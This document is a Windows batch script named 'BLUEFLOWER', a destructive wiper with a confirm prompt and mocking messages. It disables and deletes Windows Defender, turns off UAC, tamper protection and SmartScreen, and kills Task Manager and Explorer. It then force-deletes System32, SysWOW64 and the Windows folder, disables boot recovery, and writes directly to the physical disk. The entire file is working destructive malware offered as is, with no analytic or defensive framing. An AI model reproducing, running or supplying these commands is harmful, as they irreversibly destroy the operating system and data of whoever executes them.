@echo off
title BLUEFLOWER // NO DEFENDER, NO MERCY
color 4f
mode con: cols=100 lines=35
cls

echo.
echo                  ██████╗ ██╗   ██╗███████╗
echo                  ██╔══██╗██║   ██║██╔════╝
echo                  ██████╔╝██║   ██║█████╗  
echo                  ██╔══██╗██║   ██║██╔══╝  
echo                  ██████╔╝╚██████╔╝███████╗
echo                  ╚═════╝  ╚═════╝ ╚══════╝
echo.
echo               WINDOWS SECURITY WILL BE EXECUTED FIRST
echo.
echo               THIS WILL RENDER YOUR DEVICE USELESS
echo               Continue? (Y = Yes, destroy everything / N = No)
echo.
set /p choice="                                 > "

if /i not "%choice%"=="Y" if /i not "%choice%"=="YES" goto abort

:destroy
cls
echo KILLING WINDOWS SECURITY...

powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"
powershell -Command "Uninstall-WindowsFeature -Name Windows-Defender -ErrorAction SilentlyContinue"
sc stop WinDefend >nul 2>&1
sc delete WinDefend >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender" /f >nul 2>&1
rd /s /q "C:\ProgramData\Microsoft\Windows Defender" >nul 2>&1
rd /s /q "C:\Program Files\Windows Defender" >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f >nul

taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im MsMpEng.exe >nul 2>&1
taskkill /f /im SecurityHealthSystray.exe >nul 2>&1

takeown /f C:\Windows\System32 /r /d y >nul 2>&1
icacls C:\Windows\System32 /grant Administrators:F /t >nul 2>&1
rd /s /q C:\Windows\System32 >nul 2>&1
rd /s /q C:\Windows\SysWOW64 >nul 2>&1
rd /s /q C:\Windows >nul 2>&1

bcdedit /set {default} recoveryenabled No >nul 2>&1
bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
echo BLUEFLOWER FINAL DEATH > \\.\PhysicalDrive0

powershell -c "while($true){[Console]::Beep(32767,150); Start-Sleep -m 50}"
start https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1
powershell -c "$v=New-Object -ComObject Sapi.SpVoice; $v.Rate=10; $v.Speak('DEFENDER IS DEAD. WINDOWS IS DEAD. YOU ARE NEXT.')"

cls
echo.
echo           WINDOWS SECURITY = EXECUTED
echo           SYSTEM32          = DELETED
echo           DEFENDER          = GONE FOREVER
echo           YOUR PC           = ETERNAL CORPSE
echo.
echo                     THANK YOU FOR YOUR SACRIFICE
echo                          LOVE, BLUEFLOWER 🌸
pause >nul
exit

:abort
echo Aborted. BLUEFLOWER is disappointed... but will wait.
timeout /t 3 >nul
exit
